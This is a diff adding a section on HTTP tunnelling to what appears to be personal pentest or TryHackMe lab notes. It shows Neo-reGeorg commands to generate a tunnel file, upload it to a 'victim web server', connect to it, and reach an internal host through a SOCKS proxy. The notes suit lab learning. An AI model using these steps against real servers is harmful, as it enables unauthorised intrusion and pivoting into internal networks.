@@ -69,5 +69,30 @@ Fix empty spaces in base 64 file with sed:
 sudo sed -i 's/ /+/g' /tmp/http.bs64
 ```
 
+## HTTP Tunneling
+
+For HTTP Tunneling use the following project:
+
+URL: https://github.com/L-codes/Neo-reGeorg
+
+generate an encrypted client file to upload it to the victim web server:
+```
+python3 neoreg.py generate -k thm
+```
+
+Once the files are generated upload the file matching the target. So if apache running php. Upload the tunnel .php file to the server. 
+
+Establish connection to tunnel file. 
+
+```
+python3 neoreg.py -k thm -u http://10.10.211.23/uploader/files/tunnel.php
+```
+
+Should be able to pull data over socks proxy:
+```
+curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
+```
+
+
 
 
